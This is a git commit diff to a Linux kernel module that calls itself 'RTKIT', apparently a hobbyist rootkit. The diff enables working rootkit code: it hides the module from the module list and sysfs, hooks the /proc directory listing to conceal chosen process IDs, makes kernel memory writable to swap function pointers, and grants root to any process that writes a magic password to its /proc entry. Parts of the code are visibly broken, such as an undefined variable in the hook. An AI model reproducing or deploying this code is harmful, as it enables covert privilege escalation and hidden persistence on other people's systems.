fefe893839020afb169bf3f7416a3956538feea0
rjstorres <r_torres96@live.com.pt>
2018-08-02 11:04:58 +0100

    i need to learn more kernal stuff to be able to continue this

--- Test2/main.c
+++ Test2/main.c
@@ -57,8 +57,8 @@ struct proc_dir_entry
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_rtkit;
 
-static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
-static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
+static int (*proc_readdir_orig)(struct file *, struct dir_context *);
+static int (*fs_readdir_orig)(struct file *, struct dir_context *);
 
 static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -96,12 +96,69 @@ For example, 'lsmod' is the same as 'cat /proc/modules' while 'lspci' is a synon
 By altering files located in this directory you can even read/change kernel parameters (sysctl) while the system is running.
 */
 
+//MODULE HELPERS
+void module_hide(void)
+{
+    if (module_hidden)
+        return;
+    module_previous = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
+    module_hidden = !module_hidden;
+}
+
+void module_show(void)
+{
+    int result;
+    if (!module_hidden)
+        return;
+    list_add(&THIS_MODULE->list, module_previous);
+    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+    module_hidden = !module_hidden;
+}
+
+static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
+    int i;
+    for (i = 0; i < current_pid; i++)
+    {
+        if (!strcmp(name, pids_to_hide[i]))
+            return 0;
+    }
+    if (!strcmp(name, "rtkit"))
+        return 0;
+    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
+}
+
+static int proc_readdir_new(struct file *filp, struct dir_context *filldir)
+{
+    proc_filldir_orig = filldir->actor;
+    return proc_readdir_orig(filp, dirent, proc_filldir_new);
+}
+
+static void set_addr_rw(void *addr)
+{
+    unsigned int level;
+    pte_t *pte = lookup_address((unsigned long)addr, &level);
+    if (pte->pte & ~_PAGE_RW)
+        pte->pte |= _PAGE_RW;
+}
+
+static void set_addr_ro(void *addr)
+{
+    unsigned int level;
+    pte_t *pte = lookup_address((unsigned long)addr, &level);
+    pte->pte = pte->pte & ~_PAGE_RW;
+}
+
 ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data)
 {
-    /*int size;
-	
-	sprintf(module_status, 
-"RTKIT\n\
+    int size, datasize = strlen((char *)data);
+
+    sprintf(module_status,
+            "RTKIT\n\
 DESC:\n\
   hides files prefixed with __rt or 10-__rt and gives root\n\
 CMNDS:\n\
@@ -114,44 +171,63 @@ CMNDS:\n\
 STATUS\n\
   fshide: %d\n\
   pids_hidden: %d\n\
-  module_hidden: %d\n", hide_files, current_pid, module_hidden);
+  module_hidden: %d\n",
+            hide_files, current_pid, module_hidden);
 
-	size = strlen(module_status);
+    size = strlen(module_status);
 
-	if (off >= size) return 0;
-  
-	if (count >= size-off) {
-		memcpy(buffer, module_status+off, size-off);
-	} else {
-		memcpy(buffer, module_status+off, count);
-	}
-  
-	return size-off;*/
+    if (datasize >= size)
+        return 0;
+
+    if (count >= size - datasize)
+    {
+        memcpy(buffer, module_status + datasize, size - datasize);
+    }
+    else
+    {
+        memcpy(buffer, module_status + datasize, count);
+    }
+
+    return size - datasize;
 }
 
 ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *data)
 {
-    /*if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
-		struct cred *credentials = prepare_creds();
-		credentials->uid = credentials->euid = 0;
-		credentials->gid = credentials->egid = 0;
-		commit_creds(credentials);
-	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
-		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
-	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
-		if (current_pid > 0) current_pid--;
-	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
-		hide_files = !hide_files;
-	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
-		module_hide();
-	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
-		module_show();
-	}
-	
-        return count;*/
+
+    if (!strncmp(buff, "mypenislong", MIN(11, count)))
+    { //changes to root
+        struct cred *credentials = prepare_creds();
+        credentials->uid.val = 0;
+        credentials->euid.val = 0;
+        credentials->gid.val = 0;
+        credentials->egid.val = 0;
+        commit_creds(credentials);
+    }
+    else if (!strncmp(buff, "hp", MIN(2, count)))
+    { //upXXXXXX hides process with given id
+        if (current_pid < MAX_PIDS)
+            strncpy(pids_to_hide[current_pid++], buff + 2, MIN(7, count - 2));
+    }
+    else if (!strncmp(buff, "up", MIN(2, count)))
+    { //unhides last hidden process
+        if (current_pid > 0)
+            current_pid--;
+    }
+    else if (!strncmp(buff, "thf", MIN(3, count)))
+    { //toggles hide files in fs
+        hide_files = !hide_files;
+    }
+    else if (!strncmp(buff, "mh", MIN(2, count)))
+    { //module hide
+        module_hide();
+    }
+    else if (!strncmp(buff, "ms", MIN(2, count)))
+    { //module hide
+        module_show();
+    }
+
+    return count;
 }
-
-
 
 static int __init procfs_init(void)
 {
@@ -165,15 +241,15 @@ static int __init procfs_init(void)
     {
         return 0;
     }
-new_proc_fops.read=&rtkit_read;
-new_proc_fops.write=&rtkit_write;
-    /*//substitute proc readdir to our wersion (using page mode change)
-	proc_fops = ((struct file_operations *) proc_root->proc_fops);
-	proc_readdir_orig = proc_fops->readdir;
-	set_addr_rw(proc_fops);
-	proc_fops->readdir = proc_readdir_new;
-	set_addr_ro(proc_fops);
-	*/
+    new_proc_fops.read = &rtkit_read;
+    new_proc_fops.write = &rtkit_write;
+    //substitute proc readdir to our wersion (using page mode change)
+    proc_fops = ((struct file_operations *)proc_root->proc_fops);
+    proc_readdir_orig = proc_fops->iterate;
+    set_addr_rw(proc_fops);
+    proc_fops->iterate = proc_readdir_new;
+    set_addr_ro(proc_fops);
+
     return 1;
 }
 
